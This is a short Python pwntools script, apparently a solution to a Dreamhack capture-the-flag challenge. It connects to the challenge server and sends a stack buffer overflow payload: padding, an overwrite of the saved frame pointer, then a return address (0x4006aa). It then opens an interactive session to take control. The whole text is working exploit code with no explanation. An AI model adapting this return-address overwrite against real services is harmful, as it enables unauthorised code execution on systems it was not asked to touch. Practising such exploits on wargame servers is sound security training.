from pwn import *
p = remote("host3.dreamhack.games", 10561)
payload = b"A" * 0x30
payload += b"B" * 0x8 # rbp + 8
payload += p64(0x4006aa)
# payload += b"\xaa\x06\x40\x00\x00\x00\x00\x00" # Payload

p.recvuntil("Input: ")
p.sendline(payload)
p.interactive()